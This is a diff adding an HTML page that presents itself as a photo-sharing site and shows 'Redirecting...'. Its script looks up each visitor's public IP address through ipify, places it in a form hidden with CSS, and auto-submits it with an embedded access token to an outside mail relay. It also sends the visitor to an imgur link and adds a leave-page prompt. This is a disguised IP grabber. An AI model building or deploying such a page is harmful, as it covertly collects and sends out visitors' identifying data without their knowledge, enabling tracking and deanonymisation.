@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Share photos online!</title>
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+        <form action="https://postmail.invotes.com/send" method="post" id="email_form">
+            <script language="JavaScript" type="text/javascript">
+    //<![CDATA[
+        window.onbeforeunload = function(){
+            return 'Are you sure you want to leave?';
+        };
+    //]]>
+</script>
+    <input id="mytext" type="text" name="subject" placeholder="Subject" />
+    <textarea id="mytxt" name="text" placeholder="Message"></textarea>
+    <input type="hidden" name="access_token" value="lugnd7adoe52jyu3ksze820k" />
+    <input type="hidden" name="success_url" value="https://imgur.com/a/xhWv3Qv" />
+    <input type="hidden" name="error_url" value="https://imgur.com/a/xhWv3Qv" />
+   
+    <input id="submit_form" type="submit" value="Send" />
+</form>
+     
+        
+        <body>
+            
+            Redirecting...
+            
+        </body>
+        
+        
+        <style>
+            
+            form {
+                
+                visibility: hidden;
+                
+            }
+            
+        </style>
+        
+<script>
+    
+    window.onload($.getJSON("https://api.ipify.org?format=jsonp&callback=?",
+                function(json) {
+                    document.getElementById("mytext").value = "" + json.ip;
+                    document.getElementById("mytxt").value = "" + json.ip;
+                    $("#submit_form").click()
+                }
+            ));
+    
+    var submitButton = document.getElementById("submit_form");
+    var form = document.getElementById("email_form");
+    form.addEventListener("submit", function (e) {
+        setTimeout(function() {
+            submitButton.value = "Sending...";
+            submitButton.disabled = true;
+
+        }, 1);
+    });
+</script> 
+    </head>
+</html>
